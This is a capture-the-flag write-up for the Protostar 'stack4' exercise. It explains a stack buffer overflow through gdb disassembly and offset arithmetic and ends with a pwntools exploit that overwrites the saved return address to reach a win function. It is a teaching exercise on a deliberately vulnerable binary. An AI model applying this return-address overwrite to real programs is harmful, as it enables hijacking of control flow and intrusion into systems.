# stack4
## Tools
- gdb (gef)
## Disassembly
```shell
Dump of assembler code for function main:
   0x08048408 <+0>:	push   ebp
   0x08048409 <+1>:	mov    ebp,esp
   0x0804840b <+3>:	and    esp,0xfffffff0
   0x0804840e <+6>:	sub    esp,0x50
   0x08048411 <+9>:	lea    eax,[esp+0x10]
   0x08048415 <+13>:	mov    DWORD PTR [esp],eax
   0x08048418 <+16>:	call   0x804830c <gets@plt>
   0x0804841d <+21>:	leave
   0x0804841e <+22>:	ret
End of assembler dump.
```
The only thing happening in the main function is a gets call. After that, the function is returning to the previous scope of the function that called it. Since we have an entrypoint to the variable [esp+0x10] on the stack, we have to somehow utilize a stack overflow to call the win function. The only option at our disposal is to overwrite the instruction pointer (in this case eip).

The memory location a function returns to once ret is called is the instruction pointer (eip) right before it jumps to the new scope, which is pushed to the stack. Since a stack is a FILO structure, it follows that the last thing on the stack when a function reaches the ret call is said memory location. Redirecting to the win function at the end of main requires us to overwrite that return address, modifying it to a place in memory we want to go. In this case, that's the win function
```shell
Dump of assembler code for function win:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	sub    esp,0x18
   0x080483fa <+6>:	mov    DWORD PTR [esp],0x80484e0
   0x08048401 <+13>:	call   0x804832c <puts@plt>
   0x08048406 <+18>:	leave
   0x08048407 <+19>:	ret
End of assembler dump.
```
As we can see, the win function's memory location is 0x080483f4. So when we overflow the stack, the last bytes we want should be the value 0x080483f4 (reversed since little endian). But to overflow the stack with surgical precision, we need the address of the variable to overwrite.

If we set up a breakpoint in the main function after all the stack management is finished (0x08048411), we can find the new location of the base pointer with gdb's "info registers":
```shell
[...]
$ebp   : 0xffffd1f8  →  0x00000000
$esp   : 0xffffd1a0  →  0xf7ffcff4  →  0x00033f14
[...]
```
Our entrypoint is located at esp+0x10 and our target is at ebp+0x04. We can use gdb to do some hex arithmetic for us:
```shell
p $ebp + 0x04 - $esp - 0x10
0x4c
```
If the above is confusing, try to accept that the stack grows upside down in relation to the program memory. It's a difficult thing to accept. 
0x4c is 76 in decimal, which means we'll have to compose a string that's 76 + 4 characters long, and the last characters will need to be
0x080483f4 (reversed because little endian). Let's get cracking!

## Method
Much like [stack3](https://github.com/aldamd/CTF/tree/main/writeups/protostar/stack3), we're cooking this up with pwntools because I'm tired of being misunderstood by UTF-8.
```python3
from pwn import process
p = process("./stack4")
p.sendline(b"A"*76 + b"\xf4\x83\x04\x08")
p.interactive()

>>
code flow successfully changed
```

Easy as that!
